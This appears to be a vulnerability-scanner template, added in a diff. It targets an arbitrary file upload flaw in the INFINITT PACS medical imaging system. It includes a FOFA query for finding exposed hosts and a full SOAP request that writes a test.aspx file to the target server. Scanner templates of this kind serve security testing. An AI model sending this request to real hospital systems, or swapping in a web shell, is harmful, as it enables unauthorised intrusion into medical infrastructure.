@@ -1,0 +1,53 @@
+id: infinitt-webservices-WebJobUpload-fileupload
+info:
+  name: 英飞达影像存档与通讯(PACS)系统 /webservices/WebJobUpload.asmx - fileupload
+  author: leadlife
+  severity: critical
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/9eefec0a4c311a412a86ab83bef3a25d3cb1766d/%E8%8B%B1%E9%A3%9E%E8%BE%BE%E5%8C%BB%E5%AD%A6%E5%BD%B1%E5%83%8F%E5%AD%98%E6%A1%A3%E4%B8%8E%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9F/%E8%8B%B1%E9%A3%9E%E8%BE%BE%E5%8C%BB%E5%AD%A6%E5%BD%B1%E5%83%8F%E5%AD%98%E6%A1%A3%E4%B8%8E%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9FWebJobUpload%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: '"INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")'
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: 2024,fileupload,infinitt
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /webservices/WebJobUpload.asmx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+        Content-Length: 410
+        Accept-Encoding: gzip, deflate
+        Content-Type: text/xml; charset=utf-8
+        Soapaction: "http://rainier/jobUpload"
+        Connection: close
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <jobUpload xmlns="http://rainier">
+        <vcode>1</vcode>
+        <subFolder></subFolder>
+        <fileName>test.aspx</fileName>
+        <bufValue>dGVzdA==</bufValue>
+        </jobUpload>
+        </soap:Body>
+        </soap:Envelope>
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'INFINITT')
+        condition: and
